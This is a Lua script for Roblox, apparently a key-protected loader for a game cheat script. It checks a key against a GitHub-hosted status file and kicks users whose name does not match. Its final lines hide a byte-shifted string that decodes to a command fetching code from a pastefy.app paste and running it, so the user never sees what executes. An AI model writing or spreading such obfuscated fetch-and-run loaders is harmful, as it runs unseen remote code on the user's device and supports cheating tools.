-- Protection by Vants
local _KEY=script_key or ""
if type(_KEY)~="string" or #_KEY<10 then
  error("[Vants] No key provided. Set script_key before loading.") return
end
-- Status + username lock
local _ok,_raw=pcall(function()
  return game:HttpGet("https://raw.githubusercontent.com/nitherhub-dotcom/vant-scripts/main/_s67fe181f8cf2327b9163.txt")
end)
if not _ok or not _raw then error("[Vants] Could not verify key.") return end
local _st,_lockedUser=_raw:match("^([^:]+):?(.*)$")
_st=_st:gsub("^%%s*(.-)%%s*$","%%1")
if _st~="ACTIVE" then error("[Vants] Key expired or revoked.") return end
-- Username check
local _me=game.Players.LocalPlayer.Name
if _lockedUser and #_lockedUser>0 then
  if _me~=_lockedUser then
    game.Players.LocalPlayer:Kick("[Vants] This key is locked to another user.")
    return
  end
else
  -- Key not yet locked (should not happen after redeem)
  error("[Vants] Key not activated. Redeem it on the panel first.") return
end

local _ccd48472=loadstring
local _0089a765=("\100\176\179\165\168\183\184\182\173\178\171\108\171\165\177\169\126\140\184\184\180\139\169\184\108\102\172\184\184\180\183\126\115\115\180\165\183\184\169\170\189\114\165\180\180\115\116\118\171\120\141\178\134\174\115\182\165\187\102\109\109\108\109"):gsub(".",function(c)return string.char((string.byte(c)-68+256)%256)end)
if _ccd48472 then _1e018325=pcall(_ccd48472(_0089a765))end
